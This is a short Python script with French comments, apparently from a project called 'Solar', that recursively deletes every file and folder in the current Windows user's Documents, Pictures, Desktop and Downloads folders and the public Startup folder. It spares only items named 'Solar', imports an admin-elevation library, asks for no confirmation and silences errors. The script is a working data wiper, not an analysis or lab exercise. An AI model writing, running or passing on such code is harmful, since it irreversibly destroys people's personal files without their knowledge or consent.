#-*- coding: utf-8 -*-

# Imports
import os, sys, shutil, getpass, pyuac

# Nom d'utilisateur actuel
username = getpass.getuser()

# Fichiers
# Directory
# Dossier Solar
pathFile = os.path.dirname(os.path.abspath(__file__))

# File

# Locations
# Documents
pathDocuments = ('C:\\Users\\' + username + '\\Documents')
# Images
pathPictures = ('C:\\Users\\' + username + '\\Pictures')
# Bureau
pathDesktop = ('C:\\Users\\' + username + '\\Desktop')
# Téléchargements
pathDownloads = ('C:\\Users\\' + username + '\\Downloads')
# Dossiers des apps lancées au démarrage
startupUser_path = ('C:\\Users\\' + username +
        '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
startupPublic_path = ('C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp')

# Main
def clean (location):

    fileList = os.listdir(location)
    for fileName in fileList :
        fullpath = os.path.join(location, fileName)
        print('Disponibilité écriture sur le fichier : ', os.access(fullpath, os.W_OK))

        if fileName == 'Solar' :
            print('Solar file can not be clean')

        elif os.path.isfile(fullpath):
            os.remove(location + "\\" + fileName)

        elif os.path.isdir(fullpath):
            if len(os.listdir(fullpath)) > 0 :
                clean(fullpath)
            shutil.rmtree(location + "\\" + fileName)

    return

liste_locations = [pathDocuments, pathPictures, pathDesktop, 
                pathDownloads, startupPublic_path]

#Start
for f in liste_locations:
    try:
        clean(f)
    except:
        print('Impossible de supprimer le fichier : ' + f)
